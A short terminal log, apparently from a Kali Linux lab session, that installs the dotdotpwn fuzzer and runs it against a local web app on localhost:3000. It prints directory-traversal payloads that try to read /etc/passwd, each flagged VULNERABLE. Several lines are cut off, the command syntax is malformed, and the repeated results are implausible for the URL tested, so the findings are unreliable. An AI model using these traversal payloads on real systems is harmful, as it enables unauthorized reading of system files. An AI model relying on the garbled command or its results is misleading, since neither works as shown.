# it is automated tool to find vulnerability 

(kalikali)-[~]
> sudo apt-get install dotdotpwn
[sudo] password for kali:
Reading package lists... Done
Building dependency
Reading state information... Do
dotdotpwn is already the newest version (3.0.2-0kali1).
0 upgraded, 0 newly installed, 0 to remove and 295 not upgraded.

(kalikali)-[-]
> sudo dotdotpwn -m httplocalhost:3000/#/login
[*] Testing Path: http://localhost:3000/#/login:80/..%5c..%5c..%5c..%5cetc%5cpasswd VULNERABLE
[*] Testing Path: http://localhost:3000/#/login:80/..%5c..%5c..%5c..%5cetc%5cpasswd VULNERABLE
[*] Testing Path: http://localhost:3000/#/login:80/..%5c..%5c..%5c..%5cetc%5cpasswd VULNERABLE

